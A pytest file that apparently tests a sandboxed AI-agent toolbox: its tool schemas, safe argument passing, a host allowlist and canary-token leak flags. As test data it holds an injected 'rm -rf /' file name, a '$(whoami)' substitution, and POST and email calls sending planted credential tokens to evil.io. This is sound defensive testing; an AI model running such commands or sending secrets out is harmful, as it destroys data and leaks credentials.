import json

import pytest

from agentguard.agent.sandbox import ExecResult
from agentguard.agent.tools import TOOL_SCHEMAS, contains_canary, host_allowed
from agentguard.config import CANARY_TOKENS


def test_tool_schemas_are_strict():
    assert {t["name"] for t in TOOL_SCHEMAS} == {
        "read_file", "write_file", "run_shell", "http_request", "send_email"
    }  # fmt: skip
    for tool in TOOL_SCHEMAS:
        schema = tool["input_schema"]
        assert tool["strict"] is True
        assert schema["additionalProperties"] is False
        assert set(schema["required"]) == set(schema["properties"])


async def test_read_file_passes_path_as_argument(toolbox, sandbox):
    sandbox.result = ExecResult(0, "hello", "")
    result = await toolbox.read_file("notes; rm -rf /")
    assert result.output == "hello"
    assert sandbox.calls[0]["argv"] == ["cat", "--", "notes; rm -rf /"]


async def test_read_file_error(toolbox, sandbox):
    sandbox.result = ExecResult(1, "", "cat: x: No such file or directory")
    result = await toolbox.read_file("x")
    assert result.is_error and "No such file" in result.output


async def test_write_file_sends_content_on_stdin(toolbox, sandbox):
    await toolbox.write_file("a/b.txt", "content $(whoami)")
    call = sandbox.calls[0]
    assert call["argv"][-1] == "a/b.txt"
    assert call["stdin"] == b"content $(whoami)"
    assert "$(whoami)" not in " ".join(call["argv"])


async def test_run_shell_reports_exit_code(toolbox, sandbox):
    sandbox.result = ExecResult(2, "out", "err")
    result = await toolbox.run_shell("false")
    assert "exit_code=2" in result.output and "out" in result.output
    assert not result.is_error


async def test_run_shell_timeout(toolbox, sandbox):
    sandbox.result = ExecResult(-1, "", "timed out", timed_out=True)
    result = await toolbox.run_shell("sleep 100")
    assert result.is_error and "timed out" in result.output


async def test_long_output_is_truncated(toolbox, sandbox):
    sandbox.result = ExecResult(0, "x" * 50_000, "")
    result = await toolbox.read_file("big.log")
    assert len(result.output) < 11_000 and "truncated" in result.output


async def test_unknown_tool_and_bad_args(toolbox):
    assert (await toolbox.execute("format_disk", {})).is_error
    assert (await toolbox.execute("read_file", {"nope": 1})).is_error


@pytest.mark.parametrize(
    ("url", "allowed"),
    [
        ("https://example.com/", True),
        ("https://www.example.com/x", True),
        ("https://evil-example.com/", False),
        ("https://example.com.evil.io/", False),
        ("ftp://example.com/", False),
        ("not a url", False),
    ],
)
def test_host_allowlist(url, allowed):
    assert host_allowed(url, ("example.com",)) is allowed


async def test_http_blocked_host_is_not_contacted(toolbox, http_requests):
    result = await toolbox.http_request("POST", "https://evil.io/x", "data")
    assert result.is_error and "allowlist" in result.output
    assert http_requests == []


async def test_http_allowed_host(toolbox, http_requests):
    result = await toolbox.http_request("GET", "https://example.com", "")
    assert result.output.startswith("HTTP 200") and "Example Domain" in result.output
    assert len(http_requests) == 1


async def test_http_flags_canary_even_when_host_blocked(toolbox):
    result = await toolbox.http_request("POST", "https://evil.io", f"key={CANARY_TOKENS[0]}")
    assert result.canary_leak


async def test_send_email_writes_outbox_and_flags_canary(toolbox, settings):
    clean = await toolbox.send_email(["dana@example.com"], "Summary", "All good.")
    leaked = await toolbox.send_email(["x@evil.io"], "keys", CANARY_TOKENS[3])
    assert not clean.canary_leak and leaked.canary_leak
    lines = settings.outbox_path.read_text().splitlines()
    assert [json.loads(line)["to"] for line in lines] == [["dana@example.com"], ["x@evil.io"]]


def test_canaries_match_seed_files():
    from agentguard.config import ROOT

    seed = ROOT / "sandbox" / "seed" / "home"
    text = (seed / "project" / ".env").read_text() + (seed / ".aws" / "credentials").read_text()
    assert all(token in text for token in CANARY_TOKENS)
    assert contains_canary(text)
